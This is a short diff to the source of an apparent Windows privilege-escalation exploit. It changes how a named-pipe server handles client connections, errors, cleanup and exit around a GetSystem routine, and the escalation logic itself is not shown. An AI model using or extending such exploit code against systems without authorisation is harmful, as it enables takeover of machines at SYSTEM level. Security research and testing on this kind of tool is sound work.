@@ -202,6 +202,7 @@ BOOL GetSystem(HANDLE hPipe)
     else
     {
         wprintf(L" ** Exploit completed **\n\n");
+
     }
 
     if (g_bInteractWithConsole)
@@ -261,12 +262,20 @@ DWORD WINAPI launchNamedPipeServer(LPVOID lpParam) {
     if ((hPipe = CreateNamedPipe(lpName, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa)) != INVALID_HANDLE_VALUE)
     {
         wprintf(L"[PIPESERVER] Named pipe '%ls' listening ...\n\n", lpName);
-        ConnectNamedPipe(hPipe, NULL);
-        wprintf(L"\n[PIPESERVER] A client connected!\n\n");
-        if (!GetSystem(hPipe)) {
-            handleError(L"[PIPESERVER] CreateNamedPipe()", GetLastError());
+        if (ConnectNamedPipe(hPipe, NULL))
+        {
+            wprintf(L"\n[PIPESERVER] A client connected!\n\n");
+
+            if (!GetSystem(hPipe))
+                handleError(L"GetSystem()", GetLastError());
+
+            FlushFileBuffers(hPipe);
+            DisconnectNamedPipe(hPipe);
         }
+
+        CloseHandle(hPipe);
     }
+    ExitProcess(0);
     return 0;
 }
 
